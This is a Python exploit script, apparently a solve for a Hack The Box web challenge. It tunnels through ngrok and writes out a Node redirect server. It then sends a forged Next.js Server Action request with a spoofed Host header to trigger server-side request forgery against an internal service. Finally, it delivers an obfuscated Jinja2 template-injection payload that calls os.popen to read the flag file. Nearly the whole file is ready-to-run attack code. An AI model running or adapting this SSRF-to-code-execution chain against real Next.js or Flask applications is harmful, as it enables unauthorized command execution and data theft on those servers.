import os,subprocess,requests,time,random,string,re


def main():
    
    
  challenge_ip = "http://94.237.49.212:47425"
  exposed_port = '80' #default
  
  #set up your tunnel with 'ngrok tcp 80' and then resolve it with 'dig *IP*', so use the ip you get
  os.system(f"ngrok tcp {exposed_port} > /dev/null & echo $! > /tmp/pid_ngrok")
  time.sleep(1)
  
  your_server_ip = requests.get('http://127.0.0.1:4040/api/tunnels').json()['tunnels'][0]['public_url'][6:]
  
  
  
  
  
  
  

  letters = string.ascii_letters
  random_string = ''.join(random.choice(letters) for i in range(5))

  first_payload = f"""/register?username={random_string}&password={random_string}"""
  create_server(first_payload, "", '0', exposed_port)

  response = send_evil_post(your_server_ip,challenge_ip)
  token = response.text.split("token: ")[1][:32]
  second_payload = f"/home?__=b&token={token}"+"""&directory={%+with+a+=(request|attr('application')|attr((request|attr('args')|list|first,'globals',request|attr('args')|list|first)|join)|attr((request|attr('args')|list|first,'getitem',request|attr('args')|list|first)|join)((request|attr('args')|list|first,'builtins',request|attr('args')|list|first)|join)|attr((request|attr('args')|list|first,'getitem',request|attr('args')|list|first)|join)((request|attr('args')|list|first,'import',request|attr('args')|list|first)|join)('os')|attr('popen')('cat+/flag*')|attr('read')())%}{%print(a)%}{%+endwith+%}"""
  create_server(first_payload, second_payload, '1', exposed_port)

  response = send_evil_post(your_server_ip,challenge_ip)
  print("Congratulations, here is your flag: ",re.search("HTB{.*}",response.text).group())

  os.system("kill $(cat /tmp/pid*) 2> /dev/null")
  os.system("rm /tmp/pid*")




def send_evil_post(your_server_ip,challenge_ip):
  headers = {
      "Host": your_server_ip,
      "Accept": "text/x-component",
      "Accept-Language": "ja,en-US;q=0.9,en;q=0.8",
      "Cache-Control": "no-cache",
      "Connection": "keep-alive",
      "Content-Type": "text/plain;charset=UTF-8",
      "Next-Action": "0b0da34c9bad83debaebc8b90e4d5ec7544ca862",
      "Origin": f"http://{your_server_ip}",
      "Pragma": "no-cache",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-origin",
      "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "macOS"
  }
  data = "[]"

  response = requests.post(challenge_ip, headers=headers,data=data)

  os.system("kill $(cat /tmp/pid_server)")
  os.system("rm server.js")

  return response



def create_server(first_payload, second_payload, count, exposed_port):
    
    server_src = """
        const http = require('http');

        let headCounter = """+count+""";

        const server = http.createServer((req, res) => {
        console.log("Request received: " + JSON.stringify({
            url: req.url,
            method: req.method,
            headers: req.headers,
        }));

        if (req.method === 'HEAD') {
            res.writeHead(200, { 'Content-Type': 'text/x-component' });
            res.end();
        } else if (req.method === 'GET') {
            if (headCounter === 0) {
            res.writeHead(302, { 'Location': 'http://127.0.0.1:3000"""+first_payload+"""' });
            headCounter = 1;  // Incrementa il contatore
        } else if (headCounter === 1) {
            res.writeHead(302, { 'Location': `http://127.0.0.1:3000"""+second_payload+"""` });
            headCounter = 0;  // Resetta il contatore
        }
        res.end();
        } else {
            res.writeHead(405, { 'Content-Type': 'text/plain' });
            res.end('Method Not Allowed');
        }
        });

        const PORT = """+exposed_port+""";
        server.listen(PORT, () => {
        console.log(`Server is listening on port ${PORT}`);
        });
        """

    with open("server.js", 'w') as f:
        f.write(server_src)

    os.system("node server.js > /dev/null & echo $! > /tmp/pid_server")
    time.sleep(3)





try:
    main()
except Exception as e:
   print(e)
   os.system("kill $(cat /tmp/pid*)")
   os.system("rm /tmp/pid*")